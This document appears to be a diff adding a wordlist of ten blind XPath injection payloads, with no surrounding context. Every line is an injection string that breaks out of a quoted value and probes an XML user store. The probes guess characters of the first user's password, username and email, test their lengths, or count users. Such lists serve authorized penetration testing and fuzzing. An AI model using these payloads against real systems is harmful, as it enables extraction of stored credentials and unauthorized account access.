@@ -1,0 +1,10 @@
+' or substring(name(/*[1]),1,1)='a
+' or substring(//user[1]/password,1,1)='a
+' or string-length(//user[1]/password)>5
+' or count(//user)>1
+' or substring(//user[1]/username,1,1)='a
+' or substring(//user[1]/email,1,1)='a
+' or contains(//user[1]/password,'a')
+' or substring(//user[1]/password,2,1)='b
+' or substring(//user[1]/username,3,1)='c
+' or string-length(//user[1]/username)>3
